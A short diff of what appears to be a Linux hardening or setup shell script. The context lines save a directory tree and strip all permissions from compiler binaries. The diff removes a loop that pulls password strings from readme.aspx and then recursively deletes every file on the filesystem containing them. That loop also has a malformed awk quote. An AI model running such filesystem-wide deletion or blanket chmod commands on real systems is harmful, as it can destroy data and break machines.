@@ -1347,12 +1347,6 @@ apt install tree -y
 tree >> /home/scriptuser/directorytree.txt
 echo "Directory tree saved to file."
 
-grep "password:" readme.aspx | awk '{print $NF'} >> tempfile.txt
-for target_pwd in `cat tempfile.txt`
-do
-    grep -rlw $target_pwd /* | xargs rm
-done
-
 clear
 chmod 000 /usr/bin/as >/dev/null 2>&1
 chmod 000 /usr/bin/byacc >/dev/null 2>&1
